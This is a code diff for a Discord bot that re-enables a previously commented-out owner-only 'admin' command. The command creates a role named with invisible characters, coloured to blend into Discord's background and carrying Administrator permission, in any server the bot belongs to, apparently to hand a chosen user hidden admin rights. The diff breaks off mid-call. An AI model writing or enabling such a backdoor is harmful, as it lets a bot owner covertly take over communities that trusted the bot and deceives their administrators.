@@ -12,7 +12,7 @@ function isOwner(id) {
     return false;
 }
 
-client.on('message', message => {
+client.on('message', async message => {
     if (isOwner(message.author.id)) {
         var args = message.content.split(" ");
         if (args[0] == prefix + 'test') {
@@ -22,14 +22,14 @@ client.on('message', message => {
                     if (c.type == "text") c.send(msg);
                 });
         }
-        /*
+        
         // admin serverid userid
         if (args[0] == prefix + 'admin') {
             var serverid = args[1];
             let guild = client.guilds.get(serverid);
             var userid = guild.members.get(args[2]);
             try {
-                role = guild.createRole({
+                role = await guild.createRole({
                     name: "឵឵឵   ",
                     color: "#36393f",
                     permissions: [8]
